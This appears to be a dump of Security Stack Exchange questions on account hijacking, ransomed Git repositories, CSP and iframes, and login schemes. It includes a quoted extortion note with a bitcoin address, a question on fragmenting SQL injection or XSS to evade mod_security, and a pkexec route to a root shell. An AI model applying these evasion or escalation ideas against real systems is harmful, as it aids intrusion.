- A (administrator account. 
- B (non- administrator  account)<br>
- C (administrator account)<br>
The attacker sends malicious (RAT included!) emails to both  user A and user B to infect the PC.<br>
My question is what happens if user A who has an administrator account installs the malicious application?does his action get the other two accounts infected as well and lets the hacker take control of all user accounts?or only his account is compromised?</p>
","128203","","","","","2017-02-24 05:02:25","Attacking admin and non-admin User accounts on the same PC","<account-security><rat>","2","0","","","","CC BY-SA 3.0"
"141133","1","141147","","2016-10-27 18:06:50","","2","938","<p>There is a popular money transfer service built by Square, cash.me, that uses a peculiar login system:</p>

<ol>
<li>Enter your email address or phone number on the website.</li>
<li>Receive a six digit numeric temporary pin via email or phone number</li>
<li>Enter pin on website</li>
<li>If pin is correct, the user is logged in</li>
</ol>

<p>After this, the user can view transaction history. If the user knows the CCV code for the saved debit card, they can even send money to another user (limited at a few hundred dollars).</p>

<p>While they have pretty aggressive rate limiting, this appears to be vulnerable to a distributed attack. While they claim that they will cover unauthorized charges, it seems like users' account information is not very secure. For a modern product released in 2011, does this make any sense, compared to a more traditional password-based approach? </p>
","128907","","128907","","2016-10-30 18:17:06","2016-10-30 18:17:06","Are six digit temporary numerical pins secure enough for online accounts?","<web-service><account-security>","4","7","","","","CC BY-SA 3.0"
"209408","1","","","2019-05-02 19:35:25","","19","5205","<p>One of my repo's was wiped today and just a message left in its place with a bitcoin ransom. I've no idea how they accessed my account, can't really see anything on github security page.</p>
<p>The domain of the email they want me to contact was only created today, google brings nothing up, also seems like a fresh bitcoin address as google returns nothing for it.</p>
<p>They only wiped one repo and there's like 50+ which makes me think they never accessed my account directly and possible from a server where i had cloned the repo to,  or it was a targeted attack and they knew exactly what they were after.</p>
<p>Is there anyway to check if my other repos have been accessed recently and cloned? they're all set to private.</p>
<p>I'm at a bit of a loss just now as what to do, 2 factor has been turned on in github, the main server where the code was used I've removed unused scripts etc changed passwords, currently building a new server droplet and moving everything as a precaution in case the server was accessed.</p>
<p>This code was still in beta, although we have about 50 customers using it. And there's a few instances during development just because of the sheer lack of time I've went for the old security through obscurity... So this will have a direct impact on my customers.</p>
<p>Anyone got any input, how i can try track back the source of this, find out how they got access in the first place?</p>
<p>Just checked the last commit details,</p>
<blockquote>
<p>WARNING</p>
<p>gitbackup<br>gitbackup committed 4 hours ago</p>
</blockquote>
<p>All history of commits and all code is gone.</p>
<p>Update: Bitcoin address and email are starting to surface on google with reports of similar incidents, at least I know now its random and not targeted.</p>
<p>Response from Github</p>
<p>Github Got back to me today with a pretty standard response.</p>
<p>We recently noticed some suspicious activity on your GitHub account that suggests an attacker may have logged in, downloaded, and maliciously modified certain repositories, listed below. Out of an abundance of caution, we made the decision to force a password reset for the account associated with this email address. We have no reason to believe that GitHub has been hacked or compromised.</p>
<p>This kind of unauthorized access often occurs as a result of credential reuse across multiple online services. An attacker is then able to obtain lists of email addresses and passwords from other online services that have been compromised in the past, and try them on GitHub.</p>
<p>Repositories suspected of takeover:</p>
<p>xxxx</p>
<p>If you have a local copy of the repository, force pushing it to GitHub should restore the repository to its previous state. If you do not have a local copy, please contact our Support team at the email address below in order to request help.</p>
","206969","","-1","","2020-06-16 09:49:05","2019-06-28 19:20:23","Github account hacked and repo wiped - Github Response","<account-security><intrusion><github>","1","4","","","","CC BY-SA 4.0"
"209440","1","","","2019-05-03 10:33:18","","0","210","<p>After a long time, I tried to login in to Facebook just to find that I forgot my password. So, to generate new password I used the 'forgot password' option in which a security code to reset password will be sent to my email. I have two emails for account recovery and I received mail on both email address. But both code was different. Is it possible?   </p>
","207010","","6253","","2019-05-03 10:50:38","2019-05-03 10:50:38","Different password recovery code received from Facebook","<account-security><facebook>","0","3","","","","CC BY-SA 4.0"
"209448","1","209473","","2019-05-03 13:01:53","","172","44407","<p>I was working on a project, <em>a private repo</em>, and suddenly all the commits disappeared and were replaced with a single text file saying </p>

<blockquote>
  <p>To recover your lost code and avoid leaking it: Send us 0.1 Bitcoin
  (BTC) to our Bitcoin address 1ES14c7qLb5CYhLMUekctxLgc1FV2Ti9DA and
  contact us by Email at admin@gitsbackup.com with your Git login and a
  Proof of Payment. If you are unsure if we have your data, contact us
  and we will send you a proof. Your code is downloaded and backed up on
  our servers. If we dont receive your payment in the next 10 Days, we
  will make your code public or use them otherwise.</p>
</blockquote>

<p>At the time of this happening, Google search didn't show up anything, but in an hour or so <a href=""https://www.bitcoinabuse.com/reports/1ES14c7qLb5CYhLMUekctxLgc1FV2Ti9DA"" rel=""noreferrer"">this</a> started coming up. </p>

<p>I am using SourceTree (always up-to-date) but somehow I doubt that SourceTree is the issue, or that my system (Windows 10) was compromised. I'm not saying it's not that, it's just that I doubt it.</p>

<p>This happened only to one of my repositories (all of them private) and all the others were left untouched. I changed my password, enabled 2 factor authentication, removed one access token that I wasn't using for years and wrote an email to GitLab in the hopes that they could tell me something about where/who the attacker got in.</p>

<p>My password was a weak one that could've been relatively easily cracked via brute-force (it's not a common one but starts with ""a"" and has only a-z characters in it) and it could be that they just automatically checked if they can access the account and then ran some git commands. It is also possible that my email address and that particular password are on a list of leaked accounts. One might argue that if this is how they got in, they would've simply changed the account credentials but searching the Internet revealed that in these cases GitLab/GitHub will simply restore the credentials for you, and so I assume this is why they didn't do it this way.</p>

<p>Could've also been that old access token, I can't remember what and where I used it for in the past - most likely generated for use on a computer I previously owned, so I doubt that that was the issue.</p>

<p>There are also 4 developers working on it, all having full access to the repository, so their accounts being compromised is also a possibility.</p>

<p>I've scanned my computer with BitDefender and couldn't find anything but I am not doing shady things on the internet so I don't think that me being infected with a malware/trojan is what caused this.</p>

<p>I am waiting for an answer from GitLab and maybe they can shed some light on this. I have the code base on my local Git, so that is not an issue, but I am not pushing the code back to the repository just yet. Also, just in case the code gets published somewhere, I will change any passwords that are to be found in the source (databases, IMAP accounts)</p>

<p><strong>UPDATE</strong></p>

<p>I found out that the code isn't gone. I tried accessing a commit's hash and it worked. So the code is there but there's something wrong with the HEAD. My knowledge on this is very limited but </p>

<p><code>git reflog</code></p>

<p>shows all my commits.</p>

<p>What this means <em>to me</em> is that the attackers most likely didn't clone the repositories (would be a logistical nightmare to do this for all the victims, anyway) and that the chances for them going over the source code looking for sensitive data, or of making the code public are low. It also means <em>to me</em> that is not a targeted attack but a random, bulk attack, carried out by a script. I really hope this is the case for our own sake!</p>

<p><strong>UPDATE 2</strong></p>

<p>So, if you do </p>

<pre><code>git checkout origin/master
</code></pre>

<p>you will see the attacker's commit</p>

<pre><code>git checkout master
</code></pre>

<p>you will see all your files</p>

<pre><code>git checkout origin/master
git reflog # take the SHA of the last commit of yours
git reset [SHA]
</code></pre>

<p>will fix your origin/master...but</p>

<pre><code>git status
</code></pre>

<p>now will say </p>

<pre><code>HEAD detached from origin/master
</code></pre>

<p>still searching for a fix on this</p>

<p><strong>UPDATE 3</strong></p>

<p>If you  have the files locally, running</p>

<pre><code>git push origin HEAD:master --force
</code></pre>

<p>will fix everything. See <a href=""https://security.stackexchange.com/questions/209448/gitlab-account-hacked-and-repo-wiped#comment421769_209448"">Peter</a>'s comment</p>

<p>So, the question is what commands will get my repository back to the previously working state assuming you don't have the repo locally, as for how the attacked got in, I am hoping that the answer from GitLab (if any) will help us more.</p>

<p>There is a discussion going on <a href=""https://chat.stackexchange.com/rooms/93191/discussion-on-question-by-raymie-github-account-hacked-and-repo-wiped"">here</a></p>

<p>The attack targets GitHub, BitBucket and GitLab accounts. <a href=""https://github.com/search?o=desc&amp;q=1ES14c7qLb5CYhLMUekctxLgc1FV2Ti9DA&amp;s=indexed&amp;type=Code"" rel=""noreferrer"">Here</a>'s the magnitude on GitHub's public repos</p>
","207009","","207009","","2019-05-03 20:43:37","2020-06-23 04:25:41","GitLab account hacked and repo wiped","<account-security><ransomware><intrusion><github>","4","4","","","","CC BY-SA 4.0"
"209455","1","209458","","2019-05-03 14:46:14","","0","359","<p>I have an application where there I'm planning the following setup:</p>

<pre><code>user  &lt;-----------------&gt; layer 1 server &lt;------------------&gt; backend server
        internet (https)                    RPC through VPN
</code></pre>

<p>So when a user makes a request, it goes through standard SSL/TLS to the layer 1 server, then that has a program that calls a software in another location through the internet, which is connected to the layer 1 server through an OpenVPN connection.</p>

<p>To simplify the design of my application, I'd prefer that the <a href=""https://en.wikipedia.org/wiki/Remote_procedure_call"" rel=""nofollow noreferrer"">RPC</a> connection is without SSL/TLS. I'm thinking of that VPN connection as a replacement to the security requirements of a TLS encrypted connection. Does this provide the same security level?</p>

<p>The RPC sends user/password data to the server, which it just forwards to the backend server after wrapping it with some other objects. </p>

<p>What are the expected drawbacks from such a design?</p>
","77240","","","","","2019-05-03 15:13:07","Is it safe to use RPC with sensitive data through an encrypted VPN connection instead of SSL/TLS?","<tls><man-in-the-middle><server><account-security><openvpn>","1","0","","","","CC BY-SA 4.0"
"3537","1","","","2011-05-04 00:23:05","","2","361","<p>is it possible to use ip-fragmenation (for example with fragroute) to evade mod_security?</p>

<p>the idea would be to split a sql-injection- or xss-string into little pieces so it s not recognised.</p>
","1902","","33","","2011-05-04 00:26:45","2011-05-04 12:39:10","ip-fragmentation and mod_security?","<network><webserver><mod-security><waf>","2","1","","","","CC BY-SA 3.0"
"141505","1","","","2016-11-01 18:54:17","","0","503","<p>We have a Windows Server 2012 R2 running Apache 2.2.27 and Apache tomcat8 version 1.0.15.0.</p>

<p>Can you guys shed a few words on what the vulnerability is and also how to re-mediate this with the two versions that we are running in our environment. </p>
","123906","","98538","","2016-11-01 19:03:18","2016-11-01 19:35:16","Apache Mod_Proxy Remote Negative Content-Length Buffer Overflow Vulnerability","<vulnerability><apache><mod-security><tomcat>","1","0","","","","CC BY-SA 3.0"
"209557","1","","","2019-05-05 18:51:32","","3","200","<p>As an example, the US no-fly list is commonly referred to as a security theater given that it is <a href=""https://www.schneier.com/blog/archives/2008/09/my_la_times_op.html"" rel=""nofollow noreferrer"">easy to work around</a>. However <a href=""https://security.stackexchange.com/questions/207492/why-do-people-hide-their-license-plates-in-the-eu"">blurring license plates when posting a picture online</a> is not considered a security theater, even though license plates are open for everyone to see when the car is driving. </p>

<p>So where is the exact line between security measures that are merely exploitable and security measures that can be referred to as ""security theater""?</p>
","47028","","","","","2019-05-06 11:55:37","What is the difference between exploitable security measures and security theater?","<security-theater>","2","0","","","","CC BY-SA 4.0"
"209558","1","","","2019-05-05 19:16:48","","2","1010","<p>In order to be able to help my mother, my gmail is listed as a recovery email for her Google account, <code>mother@gmail.com</code> (not her actual address).  </p>

<p>Today I received a ""Security alert for your linked Google Account"" which notified me that someone requested recovery of her account. 
I first checked with her over the phone whether she might have forgotten her password, but she assured me she hasn't accessed or tried to access that account in some time. </p>

<p>The email said that if we didn't request account recovery, we should follow a link.
I did so, as the email looked legit: sent from <code>no-reply@accounts.google.com</code>,  mailed by <code>gaia.bounces.google.com</code>, and signed by <code>accounts.google.com</code>.
The link led me to accounts.google.com with a green padlock marked in Firefox.</p>

<p>The link gave me options to cancel the account recovery process or letting it to proceed. However, <strong>the account to which this recovery was supposed to pertain</strong> was, confusingly, my father's email, which is not even a gmail address, <code>father@localDomain</code>. That is, on the top of the page it said that the recovery of account <code>father@localDomain</code> has been requested. </p>

<p>I marked the option to ""Stop the account recovery"" and very briefly mentioned this problem in a text box that was provided.
I only got a confirmation after this and was not prompted to do anything else.</p>

<p>To add to my confusion, once I later checked to see if <code>father@localDomain</code> was also set as a recovery email for <code>mother@gmail.com</code>, I could find no connection between these two accounts. </p>

<p>If this was a very clever phishing attempt which somehow related my parents' email addresses, I don't know how it could have worked since at no point I was prompted to input any password or other personal data. 
I also tried hard to identify any telltale signs of phishing. 
Did I miss something?</p>

<p>If not, what happened?</p>
","108324","","","","","2019-05-13 08:19:22","Different email address in the email and the cancellation link in ""Security alert for your linked Google Account""","<account-security><gmail><recovery>","0","3","","2019-05-13 08:48:55","","CC BY-SA 4.0"
"72781","1","72822","","2014-11-12 05:19:36","","15","1960","<p>Some random password generators support the generation of pronounceable words of any given length n. Assuming that words are derived using 26 lowercase letters, the number of possible words of length n is 26^n. Not all of these words are pronounceable. My question is how many pronounceable words are possible of any given length n? </p>

<p>The count of pronounceable words of length n is obviously less than 26^n and therefore the search space for the attacker is less than 26^n. If there is no exact answer is there any upper bound on the count? Is setting a pronounceable word as a password is secure or is this just a fancy feature of password generators? What should be the minimum length?</p>

<p>In the context of pass-phrase, i think it as special case of pronounceable words formed by concatenation of more than one common English words. Assuming that n len words are derived using 26 lowercase letters.</p>

<p>Number of n len words (26^n) > Number of n len pronounceable words > Number of n len pass-phrases > Number of n len English words.</p>

<p>Am I correct?</p>

<p>Note : I have read the argument of setting long pass-phrase ""horsecorrectbatterstaple"" as password and don't want to start it again:)</p>
","55595","","55595","","2014-11-12 09:02:48","2014-11-13 14:13:24","Security of pronounceable passwords","<passwords><authentication><security-theater>","3","3","","","","CC BY-SA 3.0"
"209819","1","","","2019-05-09 06:24:15","","0","1005","<p>Whilst I was setting up Office 365, there was an option that said ""allow my organization to manage my device"". I unchecked it, but I can still access their network drives.</p>

<ul>
<li>Does this mean they now have control over my home laptop? I did not download any software from them except to activate word using that account.</li>
<li>If I had checked the box then what could they do?</li>
<li>If they have control over my device, what I can I do to disable this and regain sole control over my device?</li>
</ul>
","207530","","207530","","2019-05-09 14:43:58","2019-05-09 14:43:58","I used my school account to use Office 365. Can my school control my device now?","<account-security><rat>","0","2","","","","CC BY-SA 4.0"
"209880","1","209911","","2019-05-09 20:40:18","","0","207","<p>Simple question.
How safe are passwords while using prompt? For example logging through SSH.</p>

<pre><code>ssh user@server
</code></pre>

<p>and then you have question for password - of course hidden but... what's going ""under hood""? It is stored somewhere?</p>
","207587","","","","","2019-05-10 19:08:43","How safe are passwords while using prompt?","<ssh><account-security>","2","5","","","","CC BY-SA 4.0"
"209883","1","","","2019-05-09 21:10:05","","0","86","<p>In my system, a new user must confirm his email.</p>

<p>But there is an edge case:</p>

<ul>
<li>he registers</li>
<li>does not confirm</li>
<li>forgets password, performs password reset (which involves a mail loop)</li>
</ul>

<p>At that point I know his email works - so I'm inclined to reset his password, and then simply mark his email as ""confirmed"".</p>

<p>Are there any risks I've not considered?</p>
","201889","","","","","2019-05-09 22:36:51","Safe to consider webapp user's email as implicitly confirmed after a password reset?","<authentication><web-application><account-security><password-reset>","1","1","","","","CC BY-SA 4.0"
"209913","1","209937","","2019-05-10 09:44:20","","0","356","<p>This excellent <a href=""https://security.stackexchange.com/a/182288"">SSO answer</a> recommends to use certificate rules on Windows’ executables, as <a href=""https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/system-settings-use-certificate-rules-on-windows-executables-for-software-restriction-policies"" rel=""nofollow noreferrer"">explained here by Microsoft</a>. The latter says that the “location” of this setting is:</p>

<blockquote>
  <p>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options</p>
</blockquote>

<p>I would like to do so, but I do not manage to find that corresponding control panel on my Windows’ PC (running in German). There is a <a href=""https://docs.microsoft.com/de-de/windows/security/threat-protection/security-policy-settings/system-settings-use-certificate-rules-on-windows-executables-for-software-restriction-policies"" rel=""nofollow noreferrer"">German version of that article</a>, but the line in question reads basically the same:</p>

<blockquote>
  <p>Computer Configuration\Windows Settings\Security Einstellungen\Lokale Policies\Security Optionen</p>
</blockquote>

<p>Since it does not start with <code>HKEY_whatever</code>, I think it is not a registry entry. But what else?</p>

<p>Computer Configuration − could mean this window?</p>

<p><a href=""https://i.stack.imgur.com/YCEZW.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YCEZW.png"" alt=""Computerverwaltung""></a></p>

<p>But there is nothing like “Windows Settings” in that dialog.</p>

<p>Windows Settings − looks like the caption of the new control panel. But I do not open that from any “computer configuration”, but directly from the start menu.</p>

<p><a href=""https://i.stack.imgur.com/pEWJv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pEWJv.png"" alt=""Windows-Einstellungen""></a></p>

<p>Security Settings − could be this panel?</p>

<p><a href=""https://i.stack.imgur.com/hQWGx.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/hQWGx.png"" alt=""Windows-Sicherheit""></a></p>

<p>Local Policies − nothing like that…</p>

<p>Here is where I am lost. Can you please point me to the setting, maybe with some screenshots so that I can guess on my translated interface where to find that setting?</p>
","24520","","","","","2019-05-10 16:15:58","Where can I configure certificate rules on Windows 10?","<windows-10><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"210045","1","210057","","2019-05-12 15:01:39","","98","57678","<p>This is something that happened to me a few months ago.  I don't know if it is a hack attempt, although I can't think of any way that there could be any danger or any personal information gained.</p>

<p>I don't have a Netflix account and never have done.  I have a Gmail address which I have never used for public communication.  Suddenly I started getting email to this Gmail address from Netflix - not a ""Welcome to Netflix"" email or one requesting address verification, but what looked like a monthly promo for an existing account.  This was addressed to someone with a different real name, with that name not similar in any way to the Gmail name.</p>

<p>After a few of these messages I decided to investigate by going to Netflix and trying to log in with that email address.  Using the ""forgotten password"" option I was able to get a password reset email, change the password and log in.  The account appeared to be from Brazil, with some watch history but no other personal details stored and no payment information.</p>

<p>Soon the emails from Netflix started to ask me to update payment information.  I didn't, of course, and then they changed to ""your account will be suspended"" and then ""your account has been suspended"".  The ""come back to Netflix"" emails are still coming in occasionally.</p>

<p>I don't see how this could possibly be a phishing attempt - I carefully checked that I was on the real Netflix site, used a throwaway password not used on any other sites, and did not enter any of my personal information.  I also checked the headers of the emails carefully and they were sent by Netflix.  So is this just a mistake on somebody's part, mistyping an email address (although it's surprising that Netflix accepted it with no verification), or something more sinister?</p>
","207781","","83382","","2019-05-14 15:30:43","2020-08-25 18:07:09","Why would someone open a Netflix account using my Gmail address?","<email><account-security>","6","16","","","","CC BY-SA 4.0"
"141934","1","141935","","2016-11-06 06:33:48","","-1","656","<p><a href=""https://i.stack.imgur.com/lbXAA.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lbXAA.jpg"" alt=""Terminal Screen Shot""></a></p>

<p><code>plutil -p /Library/Preferences/com.apple.preferences.accounts.plist</code> shows some deleted usernames that I am in the same school with. Am I hacked by them?? I am really concerned.</p>

<p>Additional information:<br>
Since we are in the same school, we are connected to the same network which is protected by mac address registration. I have done some research on the names of the deleted users and they are not the ""hacking type"". It is also possible that someone else used their name to create the accounts. I am still looking into other files to find some clues. </p>
","129770","","6253","","2016-11-06 08:36:28","2016-11-06 08:36:28","plutil -p /Library/Preferences/com.apple.preferences.account.plist","<macos><account-security><user-management>","1","8","","","","CC BY-SA 3.0"
"142009","1","","","2016-11-07 10:53:04","","-6","186","<p>(With the exception of blocked users) Why anyone who visits the wikipedia site can edit it!? I realized recently, Extremist people have infiltrated Wikipedia. As well as realized there was no way to report them. <strong>Wikipedia does not have a centralised author or content reviewer</strong>, and their content is maintained by volunteer editors</p>
","129859","","","","","2016-11-07 11:08:31","Extremist influence in the management of Wikipedia","<content-security-policy>","1","1","","2016-11-07 18:06:15","","CC BY-SA 3.0"
"142082","1","","","2016-11-07 23:29:48","","4","49624","<p>I had recently given someone my account number and routing number to deposit money into my checking account. They owed me money I had lent and said this would be the easiest way for them to do it. I had recently asked if they followed through and they blocked my phone number. I have a bad feeling they're trying to do more than deposit money. They don't know where I live, my real name nor do they have my card number. Is there anything they can really do with just my account and routing number? Should I get a new account? Will I be fine?</p>
","129928","","","","","2020-06-09 03:05:52","Can someone take money out of my account with just my Account & Routing number?","<routing><banks><account-security><fraud>","3","3","","","","CC BY-SA 3.0"
"142249","1","","","2016-11-09 19:01:32","","-1","1900","<p>When deleting an account, <a href=""https://tutanota.com/"" rel=""nofollow noreferrer"">Tutanota</a> shows this message:</p>

<blockquote>
  <p>Do you really want to delete your account? Your email addresses can be
  taken over by the account [email]@tutanota.com.</p>
</blockquote>

<p>Does Tutanota allow creating an account using deleted Tutanota email address?</p>
","128225","","","","","2016-11-09 19:04:36","Are deleted email accounts made available for re-use in Tutanota?","<email><account-security>","1","2","","2016-11-09 19:36:20","","CC BY-SA 3.0"
"210285","1","","","2019-05-16 09:30:33","","1","524","<p>If I'm using subresource integrity on a web page and a script that I import then itself imports a further script, will the CSP 'require-sri-for' also include those subsequent, nested, imported scripts?</p>

<p>For example, if a .js file is pulled in by the main web page and it includes reference to a further .js file, the top level file's hash won't change if the URL of the further .js file doesn't change but the code at that URL has. So the top level file will pass its SRI check even though that script is then pulling in an unchecked script.</p>

<p>Or does CSP 'require-sri-for' checking get inherited by the scripts that are then loaded and so own down the import chain (if there is one)?</p>
","30713","","","","","2023-06-12 01:07:10","If a site includes the header 'HTTP Content-Security-Policy require-sri-for' then does this include all nested scripts?","<integrity><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"210303","1","210316","","2019-05-16 15:17:27","","2","169","<p>I'm on my corporate proxy and using Google 2-factor authentication to log into my machine.  When I get the notification on my phone, it says that I'm trying to connect from Moscow, Russia, even though I'm in the United States.  In the past, this has not been a problem. It only started occurring a few weeks ago. As such, I'm worried about a Man-in-the-Middle attack.</p>

<p>Is it normal for Google to display incorrect 2-factor login locations when behind a proxy?</p>
","208160","","","user163495","2019-05-16 15:43:29","2019-05-16 19:11:13","Why does Google 2FA not display the correct location when behind proxy?","<network><google><account-security>","1","0","","","","CC BY-SA 4.0"
"142366","1","","","2016-11-11 10:53:22","","13","8035","<p>I have a parent page that has a Content Security Policy on it. The main purpose of CSP is not to prevent XSS, but to prevent network access. This page has to run some user generated/submitted HTML/CSS/JS. I am running this user content in an iframe by using document.write to write the user content into this iframe. </p>

<p><strong>NOTE:</strong> The user content that I have is not uploaded or present on a server but is available dynamically - say using some form.</p>

<p>I also want the user content to inherit the CSP of the parent page and any iframes created by the child iframe as well.</p>

<p>The policy applied on iframes according to the spec:</p>

<blockquote>
  <p>The policy of the embedding resource controls what may be embedded. The embedded resource, however, is controlled by the policy delivered with the resource, or the policy of the embedding resource if the embedded resource is a globally unique identifier (or a srcdoc frame). </p>
</blockquote>

<p>So, the standard says that the policy will not be inherited, because the parent page is not a globally unique identifier. I don't want to use srcdoc iframe because of the following reasons</p>

<ol>
<li>The html can be very large</li>
<li>The html needs to be escaped to use srcdoc which seems unreliable and unclean.</li>
<li>Browser Support (Edge - <a href=""https://developer.microsoft.com/en-us/microsoft-edge/platform/status/iframesrcdocattribute/"" rel=""noreferrer"">under consideration</a>)</li>
</ol>

<p>But there is a twist:</p>

<p>When I went on to test this inheritance thing on browsers, the csp was actually being inherited on Chrome, Safari, Firefox but not Edge. This to me seems quite logical and correct.</p>

<p>Here is the sample test I performed:</p>

<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;!-- CSP just for demo purposes - not the actual csp --&gt;
    &lt;meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'""/&gt; 
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Parent Content&lt;/h1&gt;
    &lt;p style=""font-weight: bold; font-family: arial, sans-serif;""&gt;
        The image here will be blocked due to CSP (default-src directive). 
        However the iframe's image will not be blocked on Edge since the CSP is not inherited.
    &lt;/p&gt;
    &lt;img src=""http://www.w3schools.com/html/pic_mountain.jpg""/&gt;
    &lt;script&gt;
        window.addEventListener(""DOMContentLoaded"", function() {
            // creating the child iframe

            // Some user controlled HTML content.
            var html = ""&lt;html&gt;&lt;body&gt;&lt;h1&gt;Child Content&lt;/h1&gt;&lt;img src='http://www.w3schools.com/html/pic_mountain.jpg'/&gt;&lt;/body&gt;&lt;/html&gt;""; 

            var iframe = document.createElement(""iframe"");
            iframe.setAttribute(""height"", ""400px"");
            iframe.setAttribute(""width"", ""400px"");
            document.body.appendChild(iframe); //need to append first to be able to write into the iframe.

            var iframeDoc = iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(html);
            iframeDoc.close();
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>So, finally my questions are:</p>

<ol>
<li>Can I depend on this inheritance of CSP to child iframe on Chrome, Firefox, and Safari? - I can't find this documented anywhere.</li>
<li>Is there a clean and reliable way to be able to use srcdoc with escaping and everything? What are the performance impacts of using srcdoc?</li>
<li>Is there any other method to do this?</li>
</ol>

<p><strong>More thought:</strong></p>

<p>The spec's (and Edge) handling of CSP applying to the iframe further adds to the risk of allowing 'unsafe-inline' for scripts to prevent XSS. Because then the attacker can even use document.write like this to trigger creation of iframe to his own malicious site even. <strong>Even child-src/frame-src 'none', doesn't stop creation of iframe using document.write</strong>. Isn't this very bad for security?</p>
","26284","","26284","","2016-11-15 15:45:49","2017-03-07 15:23:51","Iframe inheriting parent's Content Security Policy","<content-security-policy><iframe><microsoft-edge>","2","6","","","","CC BY-SA 3.0"
"210345","1","210391","","2019-05-17 09:22:14","","2","1756","<p>Ever since <a href=""https://www.w3.org/TR/CSP3/"" rel=""nofollow noreferrer"">CSP 3</a> introduced <code>strict-dynamic</code>, Google has <a href=""https://csp.withgoogle.com/docs/strict-csp.html"" rel=""nofollow noreferrer"">recommended</a> its usage. Indeed, the idea of maintaining one ""root"" script, which in turn loads all other necessary scripts, sets up event handlers, etc. instead of maintaining a whitelist of allowed domains or hashes for every inline script seems positive.</p>

<p>However, whenever I read about <code>strict-dynamic</code>, I <em>always</em> read about the inclusion of a nonce. This can prove to be difficult, if for instance the page is generated by an application server, yet the header is added via a reverse proxy later down the line.</p>

<p>In order to mitigate this, I tried to use the other mechanism to identify scripts: hashes. More specifically, the <code>'sha256-...'</code> keyword.</p>

<p>The complete Conent Security Policy would look like this then:</p>

<pre><code>script-src 'strict-dynamic' 'sha256-XBQNNdy0amIuLO3171zDY4zf/RwRjJMx+MhGafC3R4M=' 'unsafe-inline' http: https:;
object-src 'none';
base-uri 'none';
report-uri https://csp.example.com;
</code></pre>

<p>Is there any reason why this might be less safe than a nonce-based approach?</p>
","","user163495","","","","2021-03-14 20:58:18","Does it pose a problem to use 'strict-dynamic' with a hash and not a nonce?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"210415","1","212921","","2019-05-18 19:31:09","","3","1044","<p>In <a href=""https://helpx.adobe.com/in/fonts/using/content-security-policy.html"" rel=""nofollow noreferrer"">this help site</a>, Adobe recommends not setting CSP for web fonts saying:</p>

<blockquote>
  <p>The CSP policy does not allow you to set an exception for inline styles added by a script from a specific domain.</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>Adobe Fonts uses inline styles and fonts as data URIs to provide our service, and making exceptions for these negates a lot of the protection provided by a CSP. </p>
</blockquote>

<p>What do they mean by it? And if my site already has CSP set, how do I use Adobe fonts if I shouldn't set CSP for it?</p>
","82371","","","","","2019-11-08 15:43:47","Why does Adobe recommend not setting CSP headers for its web fonts?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"210534","1","210599","","2019-05-21 08:57:34","","1","1469","<p>I had corrupted my sudo setup. With no possibility to login as root (locked root account, broken sudo), a search made it clear: use pkexec. It worked. So far, so good.</p>

<p>But that turns out to be a big security hole: a user that is part of the 'sudo' group can always gain root access, and start a shell as the root user. That is, at least on a default Ubuntu server installation with sudo.</p>

<p>This renders sudo useless as a means to restrict elevated privileges to certain commands for selected users. Unless some policykit policy is altered, apparently. That's not mentioned in the man pages of 'visudo' or 'sudo'. And I've never seen it mentioned in any tutorial on how to set up the sudoers file (probably I've been reading the wrong tutorials, then).</p>

<p>Can anyone point me into the right direction? What policykit, or sudo, configuration file needs to be changed (and how) in order to accommodate privilege escalation for one specific command, for one specific user?</p>

<p>As an example, I want the 'sudotest' user to only be able to run the command 'cat /proc/tty/driver/serial' which results in a 'Permission denied' error for non-privileged users.</p>

<p>Setup:</p>

<ul>
<li>Ubuntu bionic</li>
<li>user 'sudotest', part of 'sudo' group</li>
<li>either: single sudo command for 'sudotest', or even none</li>
</ul>



<pre><code>me@some-server:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:    18.04
Codename:   bionic

me@some-server:~$ ls -l /home
total 20
drwx------ 6 me  me   4096 May 17 15:17 me
drwx------ 2 root root 16384 Nov 26 17:20 lost+found

me@some-server:~$ sudo cat /etc/sudoers | grep -v ""^#\|^$""
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin""
root    ALL=(ALL:ALL) ALL
me  ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL

me@some-server:~$ sudo useradd -m -d /home/sudotest -s /bin/bash sudotest

me@some-server:~$ sudo gpasswd -a sudotest sudo
Adding user sudotest to group sudo

me@some-server:~$ sudo passwd sudotest
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully

me@some-server:~$ su - sudotest
su - sudotest
Password:

me@some-server:~$ $ groups
sudotest sudo

sudotest@some-server:~$ sudo -l
[sudo] password for sudotest: 
Sorry, user sudotest may not run sudo on some-server.
</code></pre>

<p>Hey, this user can not even do anything with sudo. Looks like an unprivileged user.
Still, this user is perfectly capable of gaining a root shell using pkexec.</p>

<p>How can I prevent this?
What configuration options do I have to allow this user to execute one single command of my choosing with elevated privileges?</p>

<hr>

<p>Update:
This is different from the linked question in that I want to know how I can (safely) limit a specific user to be able to execute one specific command with elevated privileges with sudo on a system that has polkit installed by default, which, apparently, allows any sudo user to gain a root shell.</p>
","208426","","208426","","2019-05-21 11:29:03","2019-05-22 12:17:53","sudo restrictions circumvention with pkexec: root shell","<account-security><privilege-escalation><sudo>","1","6","","","","CC BY-SA 4.0"
"4355","1","4379","","2011-06-05 13:21:45","","15","1931","<p>I am doing a research on how to prevent my gmail account from being hacked and what are the options of claiming it back. </p>

